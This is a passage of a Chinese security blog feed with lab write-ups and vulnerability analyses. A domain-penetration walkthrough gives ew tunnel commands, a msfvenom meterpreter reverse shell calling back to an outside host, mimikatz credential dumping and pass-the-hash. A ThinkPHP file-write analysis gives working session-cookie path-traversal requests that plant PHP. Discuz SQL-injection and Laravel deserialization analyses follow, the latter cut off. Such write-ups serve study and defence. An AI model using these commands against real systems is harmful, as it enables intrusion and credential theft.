title="nbtscan(确定域控)"></a>nbtscan(确定域控)</h3><p>DC字段就是域控主机</p><p><img src="./image-20200128175054765.png" srcset="/img/loading.gif" alt="image-20200128175054765"></p><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>确定当前用户在域中</p><pre><code class="hljs routeros">whoami /allnet<span class="hljs-built_in"> user </span>administrator /domain</code></pre><p><img src="./image-20200128172423776.png" srcset="/img/loading.gif" alt="image-20200128172423776"></p><p>查询域管理员</p><pre><code class="hljs routeros">net<span class="hljs-built_in"> group </span><span class="hljs-string">"domain admins"</span> /domain</code></pre><p><img src="./image-20200128172915038.png" srcset="/img/loading.gif" alt="image-20200128172915038"></p><h1 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h1><h2 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h2><p><a href="https://github.com/idlefire/ew" target="_blank" rel="noopener">https://github.com/idlefire/ew</a></p><p>先做个转发，方便后续操作。</p><p><img src="./image-20200128180817576.png" srcset="/img/loading.gif" alt="image-20200128180817576"></p><pre><code class="hljs yaml"><span class="hljs-attr">Kali:</span> <span class="hljs-string">./ew_for_linux64</span> <span class="hljs-string">-s</span> <span class="hljs-string">rcsocks</span> <span class="hljs-string">-l</span> <span class="hljs-number">1080</span> <span class="hljs-string">-e</span> <span class="hljs-number">8888</span><span class="hljs-attr">windows:</span> <span class="hljs-string">ew_for_Win.exe</span> <span class="hljs-string">-s</span> <span class="hljs-string">rssocks</span> <span class="hljs-number">172.16</span><span class="hljs-number">.48</span><span class="hljs-number">.133</span> <span class="hljs-string">-e</span> <span class="hljs-number">8888</span></code></pre><p><img src="./image-20200128181707663.png" srcset="/img/loading.gif" alt="image-20200128181707663"></p><p>kali设置代理</p><p>proxychains.conf</p><p><img src="./image-20200128183111671.png" srcset="/img/loading.gif" alt="image-20200128183111671"></p><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><pre><code class="hljs angelscript">msfvenom -p winodws/x64/meterpreter/reverse_tcp lhost=<span class="hljs-number">172.16</span><span class="hljs-number">.48</span><span class="hljs-number">.133</span> lport=<span class="hljs-number">2333</span> -f exe &gt; ~/Desktop/re.exe</code></pre><p><img src="./image-20200128183400306.png" srcset="/img/loading.gif" alt="image-20200128183400306"></p><pre><code class="hljs routeros">proxychains msfconsoleuse exploit/multi/handler<span class="hljs-builtin-name">set</span> payload winodws/x64/meterpreter/reverse_tcp<span class="hljs-builtin-name">set</span> LHOST 172.16.48.133<span class="hljs-builtin-name">set</span> LPORT 2333run</code></pre><p><img src="./image-20200128183943628.png" srcset="/img/loading.gif" alt="image-20200128183943628"></p><h3 id="getsystem提到系统权限"><a href="#getsystem提到系统权限" class="headerlink" title="getsystem提到系统权限"></a>getsystem提到系统权限</h3><p><img src="./image-20200128184408230.png" srcset="/img/loading.gif" alt="image-20200128184408230"></p><h3 id="绑定进程"><a href="#绑定进程" class="headerlink" title="绑定进程"></a>绑定进程</h3><p><img src="./image-20200128184639395.png" srcset="/img/loading.gif" alt="image-20200128184639395"></p><h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><p><img src="./image-20200128184805024.png" srcset="/img/loading.gif" alt=""></p><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p><img src="./image-20200128184911091.png" srcset="/img/loading.gif" alt="image-20200128184911091"></p><h3 id="使用wdigest命令获取登录过的用户储存在内存里的明文密码"><a href="#使用wdigest命令获取登录过的用户储存在内存里的明文密码" class="headerlink" title="使用wdigest命令获取登录过的用户储存在内存里的明文密码"></a><strong>使用wdigest命令获取登录过的用户储存在内存里的明文密码</strong></h3><p><img src="./image-20200128185022460.png" srcset="/img/loading.gif" alt="image-20200128185022460"></p><h2 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h2><p>通过mimikatz的wdigest命令获取到明文密码</p><p>利用<strong>pass the hash</strong>控制域内账户</p><p>利用正向连接shell易被防火墙阻挡</p><p><img src="./image-20200128191538579.png" srcset="/img/loading.gif" alt="image-20200128191538579"></p><p>这里直接找域控连,</p><pre><code class="hljs angelscript"><span class="hljs-keyword">set</span> RHOST <span class="hljs-number">192.168</span><span class="hljs-number">.52</span><span class="hljs-number">.141</span></code></pre><p>连上又断了,尝试下进程迁移，还是断了</p><p><img src="./image-20200128192102792.png" srcset="/img/loading.gif" alt="image-20200128192102792"></p><p>竟然有明文密码，就开3389端口搞(乘会话没断)</p><pre><code class="hljs routeros"><span class="hljs-comment">#这个是msf获取shell之后的用法</span><span class="hljs-comment">#开启3389</span><span class="hljs-builtin-name">run</span> post/windows/manage/enable_rdp<span class="hljs-comment">#添加用户</span><span class="hljs-builtin-name">run</span> post/windows/manage/enable_rdp <span class="hljs-attribute">username</span>=<span class="hljs-string">"osword"</span> <span class="hljs-attribute">password</span>=<span class="hljs-string">"zlfufu123?"</span></code></pre><p>发现添加不上用户，不管了，直接用administrator账户登陆</p><pre><code class="hljs angelscript">proxychains rdesktop -f <span class="hljs-number">192.168</span><span class="hljs-number">.52</span><span class="hljs-number">.141</span></code></pre><p><img src="./image-20200128193622004.png" srcset="/img/loading.gif" alt="image-20200128193622004"></p><p>其实也可以用ms系列直接打，但是那样学不到东西。</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://zhuanlan.zhihu.com/p/49959665" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/49959665</a></p><p><a href="https://glotozz.github.io/2020/01/15/vulstack域渗透靶场-wp/" target="_blank" rel="noopener">https://glotozz.github.io/2020/01/15/vulstack%E5%9F%9F%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA-wp/</a></p><p><a href="https://zero-day.io/get-a-meterpreter-shell-with-psexec/" target="_blank" rel="noopener">https://zero-day.io/get-a-meterpreter-shell-with-psexec/</a></p><p><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>域滲透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP&lt;6.0.2任意文件内容写入/覆盖</title>
    <link href="/2020/01/25/ThinkPHP-6-0-2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%86%99%E5%85%A5-%E8%A6%86%E7%9B%96/"/>
    <url>/2020/01/25/ThinkPHP-6-0-2%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%86%99%E5%85%A5-%E8%A6%86%E7%9B%96/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>利用thinkphp 6.0.2 session生成中，<code>sess_</code>后字段可控构造PHP文件。且文件内容可控造成getshell或文件覆盖</p><p>该漏洞并非可以通过越权执行，需要一定的身份认证.</p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>调用cookie方法获取以”PHPSESSID”为键的值，可控。</p><p><img src="./image-20200125213345332.png" srcset="/img/loading.gif" alt="image-20200125213345332"></p><p>最后存入id字段中，这里会判断长度是否为32</p><p><img src="./image-20200125213503023.png" srcset="/img/loading.gif" alt="image-20200125213503023"></p><p>接着开始执行session方法</p><p><img src="./image-20200126023713851.png" srcset="/img/loading.gif" alt="image-20200126023713851"></p><p>$this-&gt;data(文件内容)，在session函数执行过程中，所以可以一定证明并非无条件.</p><p><strong>可以给我们提供一定的挖掘思路，可以定位session:set函数</strong></p><p><img src="./image-20200126023729887.png" srcset="/img/loading.gif" alt="image-20200126023729887"></p><p>文件：src/think/session/Store.php</p><p>先调用getId方法，获取id字段。</p><p><img src="./image-20200125214449203.png" srcset="/img/loading.gif" alt="image-20200125214449203"></p><p>跟进write方法,最后会调用writeFile方法</p><p><img src="./image-20200125214747878.png" srcset="/img/loading.gif" alt="image-20200125214747878"></p><p>跟进writeFile方法，可以看到执行了文件写入操作.</p><p>文件名:<code>/Applications/MAMP/htdocs/tp60/runtime/session/sess_1234567890123456789012345673.php</code> 可控.还有个危害就是覆盖已知文件，伪造session或过滤文件等.</p><p><img src="./image-20200125214848576.png" srcset="/img/loading.gif" alt="image-20200125214848576"></p><h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tp60/public/index.php/index/session2?name=&lt;%3fphp+phpinfo()%3b%3f&gt;</span> HTTP/1.1<span class="hljs-attribute">Host</span>: 127.0.0.1:8888<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0<span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate<span class="hljs-attribute">DNT</span>: 1<span class="hljs-attribute">Connection</span>: close<span class="hljs-attribute">Cookie</span>: XDEBUG_SESSION=PHPSTORM; PHPSESSID=1234567890123456789012345673.php<span class="hljs-attribute">Upgrade-Insecure-Requests</span>: 1</code></pre><p><img src="./image-20200125215214613.png" srcset="/img/loading.gif" alt="image-20200125215214613"></p><h2 id="路径穿越写shell"><a href="#路径穿越写shell" class="headerlink" title="路径穿越写shell"></a>路径穿越写shell</h2><pre><code class="hljs angelscript">GET /tp60/<span class="hljs-keyword">public</span>/index.php/index/session2?name=&lt;%<span class="hljs-number">3f</span>php+phpinfo()%<span class="hljs-number">3</span>b%<span class="hljs-number">3f</span>&gt; HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">8888</span>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Macintosh; Intel Mac OS X <span class="hljs-number">10.15</span>; rv:<span class="hljs-number">72.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">72.0</span>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><span class="hljs-comment">DNT: 1</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">Cookie: XDEBUG_SESSION=PHPSTORM; PHPSESSID=../../../kkkkkkkkkkkkkkkkkkk.php</span><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span></code></pre><p>因为这里<em>sess_..*目录不存在需要多一个</em>../*进行目录穿越</p><p><img src="./image-20200125221633011.png" srcset="/img/loading.gif" alt="image-20200125221633011"></p><p><img src="./image-20200125221840371.png" srcset="/img/loading.gif" alt="image-20200125221840371"></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="[https://mochazz.github.io/2020/01/14/ThinkPHP6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99/#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90](https://mochazz.github.io/2020/01/14/ThinkPHP6.0任意文件写/#漏洞分析)">ThinkPHP6.0.x任意文件创建、覆盖</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>niushop&lt;=2.3前台getshell(密文保护)</title>
    <link href="/2020/01/22/niushop-2-3%E5%89%8D%E5%8F%B0getshell/"/>
    <url>/2020/01/22/niushop-2-3%E5%89%8D%E5%8F%B0getshell/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="d8884dd1c6a5bc52403c3d7cfa0af4dcc26f21796ddc8ce76b5e5ccab30ef588">92b220d2f5ca53ea67b966ec09e59533594950539975a4828dc3b397fbd2b2b6438e16996d387ffe650d15efc851ebd603db67734ce913b54ffc9b28df27373a8a8b1531e1235e6181a02eb87b584a2f036557f46df2e2444aaa84cf50f79f2046fd63ea741e1132e3055fdd55425938de4473945f727d3970ef7d90a3e3b980daf6dbb9e2579fbb9569365a3942d21ea7588a0bc653ce224a5503c4396f14ce37f8888ddb215fb3b1ede069ae1330e29d443b42262391d8163a12797243f50982d9587df3e65998c386dff42e20b2b061d79d305fdc9eec8ec9c677902980d9cf56c9e5e5d526e765508cdc41bbfe3ceaa9970067fa8381d2cf50631334197acac90581b8d5cfe7957846afc080548fecffde5bcfd0e4d43eafe5d8be2bbcf855b04b8860b4a994623950deef5491e6214b30355afb93e2095adc1d69ea2ed8212f2c215c9bdccd7d3d3a995e42f93c5fb2db56fbcac77e46ce685d70c3ed06f72af97b186fa7708d895c1c4992ea1082782858fa6ed002469d83c9ba42d9225980322485b410ddb4be5ac558bcc8fdb309ab3d93c81d51c891e69e2506695e2d868e0a4a6e8060f3bfa6f18b8b535d3e8a7482fc3b1fbeef7934a04c34f398fd918bf34263b12cf1e674c9c1aa8d53dc61fc6558a1ac32bc82c76938b806d433924ba6cbee9d9bf45f039aadec8df613402147294254ffec402010abe3fb3e125c1eb68ac85bcc41357026224a5586814d3c83f157288efdaf108a51f11147fd4a9d455c1b15f8d8c37a707584a13877ad23c072f22dca02df772ef1adc30d3e0a5699f85d1737dea8a985499684a1b0abba30e3d5256e3ea3805ab85c4a10ed1f73084c049269dcb43f21eaa38a531a5f9217aecd1915cd5a6d76ea11ff63a528b678789e84989e9bac67bfa742b1c5a48a23070a0cc127dfac478de25569741739739ff7b29ee06adb200b8392b018bc551a3129ef801039acaa2361e85e0c03fe2b3553df42c3f0112a33f07ffab0e3d837a9fee1a76d0dd644c7c69369551a0119145b1bebd30560da221ab3b5967f3293ec86b7d8fc8984d6bafb0977a814e2312dfe209874c57149dfc7bdd7f9a0a6e13d0c45e9c560e636bb7badccfcfbd83d18ea5aa3faff0cfa37f46b63412fd86adc72cdc78b3df95ad09b9b38f9135f5adb7c7a10e3042e84a132ec57edddffcb4a3b99269e86124affa19dd4e5dddfa71c1578dfa91bc97a640f0312498901f1f51638cfa45bcfcba14e96598884f280252f94493386ca49d774092723e0135e593afea46616572a739438a2fe072fbb48d69c7ee4d0a5a72bd7656235601e093e5702f57e4750b58f307f60b35d2839c5261e63a8ca7cd5e72474b8abe5d556d4dd92391b655e0271134f3f51b90bfa2063cc866cbf5213972861180cb94c047b2788cac51e663b9d6c5af62514b1c4d0da33f3212571bc386af0616f4b641b8ccba3778636b2c6390553c507b40a85563c1d487acc35e8d6e51a3429b2ade69037dd02edff063afc3880709ab0e525c7e28b3e18c33a8d5b98f6d3e07d4e780695758dbb24fee806b596bcb1debc6ee9b3aa1b3fc64fd2be91d646999eff8e320cf29db08312657b084570344286d52a047829091021271e3cb713ced2d55d6e2c14e6b54527dee4c2ddc0f74e6a725bdcf620225febe89ff9362b3d41e7e3181126659e93b695bcd11bf6bd2a3163c16276a9fb203b286beb09aeb4a07501b23faca8deefc74b8c37756806aab8442fd07bdebf765298bf0b9b42cee6b6f870bbe47bdf463cc6981da2b5257d6f8277c33966ce262becf086c03901094130988c9215c8cb0bfe6220b4e6b02117c4a1f62decd6439046e0a379ad97f8c6d21a3ee715a3979d0dd68d916c95c7a413fa385c04e8181e5bd60f2d00b0ad06c4e9599d363f3a478a4cb9edbf5ec28f2b3e6cdfd977d0ad74b4971ed2ff076bd207b9cd0c65f7142447b252c82bfdcbdca996b55cf22b0614ba0cbceb4033762de455de0ba66f696ca8e3a51cf070fc9dff4283b62822aaccd7ed3861debffe1577a5efa20ebe526817b5df56b713ca9e855f2682df40c4c681071dfda59f69244dea524e91b1ed285360ac44b58566e6c70a1d0d77da5614f72167aa8eab1934e6136b8b31e4f9076a604c8f2e6d01076d91eb35398b2b1a3eb3e0b85aa0d8c48c8e2caa0ac2eb44df909abddbb42935ac581be13fb986d95f76a86eb9f537df4b470ca734b1b31acab5385d66e79d8f4e9e1eed73eee589219e9f044a394c4d250780d8bc08162f44ad7945687b8836ca9000d96ebe0f2690c686aa627e0c28ad1462054c335d3bedec975d19197cc9f698baf306d14da1b648fe52b78e2345125b87e6d2adc3f781e8487174b313734b85f098d3093f086e9deb46658a5493549d36e904df6553f89af207a7df7c86301bb33803c652cc24a071fce99dd4c83b96f31d36df1f8db6ca0fca1527a09d775108d70a8a6fd06c2050f8eec1daa3b9f68a4382e9034741838650e972f9af45f44b20b0d083289eb81da8913b4ec4ea003fb062dcbf7d5920b214dd72648c6030c5712f604aba5db8433764be941aaf6340eb2e309f9498add590b1303e3cf610701646a1d4ed5bd666621e38633ce92a84ffa9c08467f393d207244016b44535cf3fbecec5a8671874caa514efd5475c98984b35d82554bd547b7350cd4abf9d0d519bf65bf34ca8ea0b720b83733a65fbffc664647a9f413ea8ef383baf299942f20b9cb0a38821e4f6fb2db7635fefccd8b68e3968a7358930733acb36048c257e102d0f444fd88fb922b092a5e9b43892aeb3209cd0d5bbc2b62bd2aa92192c31f8b3e8c8eac8befd945e1c7770a6da656c989929cfebf54d07e01ca1d60fa02e9e3bbb24db829bc1a16f063171ca4db5bc5fc58f0f2448ca6c6f9b8a0bc62d2f299529ea91c0d3f99ea632258d48e39a1d0e8612ec90e7ca9a48036b4fdd80803e49e9ae76ab0b6cd8617143c3eb07ef23e6461f0988f13aeffbdf6961532d30bd84838b1c2117bbf6ed5ef9d0cbb3110ef4d4f300cfe375f5d21e4b650be5bc5b5d1bc377bca74f75b128aa1ba678f7356f7eaaa1d7af033ecef177f1c2b2d0a5ff74250791764b2618bb4dca91b245e82bceb1ae0fd7ec6477d43bbaf54e41fa45208aa46b1d68046e49a5b3dfdd4e5546fe288a3ed1684eeffbc2292df4a9eaeb2bc7675f53d9ac860cd79fdb7e60e5c3c1fb22318fe407526bc62f4efa53e783e65979845ca99a814202b9e26639ab8f2ec399dce2e741a6fd86cfc2eab9affd966f7d6936d17532a95e6da3cb59451639ddb31a6e1a9d2b32531419cf65fe2197513776ca4bccc97b92de8ccda1ebf75a3b81537131bfe462f550acc8425add23f32af828095e4a9215a7adb1e2a392bb5d4cf97c963053d2d3e6b4c4936202f59ff069f78cb1ad2b28f6b6eea66f6855d64bf8615f89fa0b6087d1daa267dc99f6e012ae520aee6f8f29b40832d5af75fe83d70ccd0c2f081b5934f11e6bc2671b13ad087a152c760519d38a5cd58307eee2abf5e30dfe6262df151d06ebf979cba4aa2f0c08bf36fbb5b097ac70f9ee6bd01fbc6c836490a643ebb684922fb51f8ab64fe8ab716a6485a3ce2dea119af68e39f6eeed11bb3d382c19cd6a7ed75577befc1c0adaf66a3cb21cfda544d1a16542d4fdfa76752c8bb580eb542326a52be6fefd92a34c5c39be5ddb86ae5d8e6a3f1ef90c8c9b63b5db5198ae0248508ed007cf61c0f1b493c143e45c66272a8567dae66db68c3ac529a0e44221833dab71aa7a9bf5f22305b4de65ecb7ede90b0a8b4c40b263d767765019ff6d75325d348c886cd5b3cd54f5e1ebff7faed53adaa7463b478ee96b450be8e369b602178fa795ffd21a2e894653d30d8188c9341848d028858d156291986d127608b38d31ca1624c88d67957af0b23f2740048983355a85f76e8a87ba797a072117feee67bbd17fa86cd7e38ce15767f8d11aba3b6fed333f485107824c5b3762c755de20b5414a6a9fbebbd77cbbf307b56352b157025b489115609cde3eb35261cdfe3d49eceeb78b7ce65a760ce240a49652f75f9af0edd760ad0570ff49b2210d3d0dcfe9146fa9fd48e2e5a6bdc23d8358c644aa1e1b18ceb8324e10f5fa9a038f52bae0732f792fe7044c604e6c9783b7eaa9a8db5f64bd0659671e4c63cc844dedd0fa</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ThinkPHP v5.0.x 反序列化利用链挖掘(密文保护)</title>
    <link href="/2020/01/02/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-ThinkPHP-5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2020/01/02/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98-ThinkPHP-5-0-x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="5ea5d1c128ccad7bb4661361418289214a3a7156ef4670f29ba221783222d8a9">34c6f48ba95a37eb7d28a1ddf61a11a7</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[漏洞挖掘]MyuCMS&lt;=v2.2.1反序列化(密文保护)</title>
    <link href="/2019/12/28/MyuCMS-v2-2-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2019/12/28/MyuCMS-v2-2-1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="beeb0f2ebb46a2fc0ed271cb7efb07b471ca8f32066da61fb9b1f4e0d3fe49d8">ce21364c024e4d0343d7c954eecff585</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[渗透测试]记一次抠脚渗透测试(密文保护)</title>
    <link href="/2019/12/27/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98-%E5%88%A9%E7%94%A8%E6%9F%90cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/"/>
    <url>/2019/12/27/%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98-%E5%88%A9%E7%94%A8%E6%9F%90cms%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E5%88%B0%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0getshell/</url>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">别猜了，密码我都不知道</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="beeb0f2ebb46a2fc0ed271cb7efb07b471ca8f32066da61fb9b1f4e0d3fe49d8">ce21364c024e4d0343d7c954eecff585</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Discuz!&lt;=3.4后台基于文件内容的二次注入</title>
    <link href="/2019/12/15/Discuz-3-4%E5%90%8E%E5%8F%B0%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%9A%84%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-1/"/>
    <url>/2019/12/15/Discuz-3-4%E5%90%8E%E5%8F%B0%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E7%9A%84%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-1/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>即使是后台漏洞，但是漏洞触发原理其实很有趣，二次注入一直关注数据库的插入查询触发，忽视其他可能的隐患点.</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>经过addslashes存入文件中,从文件中取出字符,转义符号丢失，造成二次注入</p><p><img src="./1576397045584.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>后台路由形式：<code>?action=xxx =&gt; ../admincp_xxx.php</code>    </p><p><img src="./1576397835592.png" srcset="/img/loading.gif" alt=""></p><p><strong>upload/source/admincp/admincp_setting.php</strong></p><p>登录后台后，可以修改<code>UC_APPID</code>值，传入参数为<code>$settingnew[&#39;uc&#39;][&#39;appid&#39;]</code></p><p><img src="./1576397160777.png" srcset="/img/loading.gif" alt=""></p><p>成功写入恶意<code>UC_APPID</code>后，执行更新读取新的配置信息</p><p><img src="./1576398246417.png" srcset="/img/loading.gif" alt=""></p><p><strong>upload/uc_client/model/base.php</strong></p><p>最后在<code>note_exists</code>方法中触发注入</p><p><img src="./1576397506761.png" srcset="/img/loading.gif" alt=""></p><p>调用栈如下</p><p><img src="./1576398604376.png" srcset="/img/loading.gif" alt=""></p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>写入sql语句</p><p><img src="./1576397314588.png" srcset="/img/loading.gif" alt=""></p><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p><p><img src="./1576397336785.png" srcset="/img/loading.gif" alt=""></p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://xz.aliyun.com/t/6927" target="_blank" rel="noopener">Discuz! X系列全版本后台Sql注入漏洞</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Laravel 5.8 反序列化(一)</title>
    <link href="/2019/12/14/Laravel-5-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/"/>
    <url>/2019/12/14/Laravel-5-8-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ol><li><p>创建文件<strong>Http/Controllers/TestController.php</strong></p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">App</span>\<span class="hljs-title">Http</span>\<span class="hljs-title">Controllers</span>;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span><span class="hljs-params">()</span></span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">"Welcome Laravel58"</span>;        unserialize($_GET[<span class="hljs-string">'url'</span>]);    &#125;&#125;</code></pre></li><li><p>添加路由<strong>routes/web.php</strong></p></li></ol><pre><code class="hljs routeros">Route::<span class="hljs-builtin-name">get</span>(<span class="hljs-string">'/bug'</span>, <span class="hljs-string">'TestController@index'</span>);</code></pre><h1 id="POP链分析"><a href="#POP链分析" class="headerlink" title="POP链分析"></a>POP链分析</h1><p>反序列化入口为<strong>src/Illuminate/Foundation/Testing/PendingCommand.php</strong></p><p><img src="./1576309607070.png" srcset="/img/loading.gif" alt="1576309607070"></p><p>跟进<code>run</code>方法,危险函数入口位于<code>call</code>方法，但之前需要执行<code>mockConsoleOutput</code>方法</p><p><img src="./1576309976410.png" srcset="/img/loading.gif" alt="1576309976410"></p><p>跟进方法<code>mockConsoleOutput</code></p><p>这里通过debug之后会down在<code>foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output)</code>，幸运的是这里两个变量都是类变量，</p><p><img src="./1576310404530.png" srcset="/img/loading.gif" alt="1576310404530"></p><p>起初尝试寻找并实现<code>expectedQuestions</code>属性，很困难，大量的抽象类以及trait型(tcl).这里学到一个trick：由于test可控可以赋值为任意对象,只要对象中存在<code>__get</code>方法就能够绕过.这里利用的是<code>Illuminate\Auth\GenericUser</code>类</p><p><img src="./1576310318296.png" srcset="/img/loading.gif" alt="1576310318296"></p><p>构造如下也能够顺带绕过<code>foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question)</code></p><pre><code class="hljs 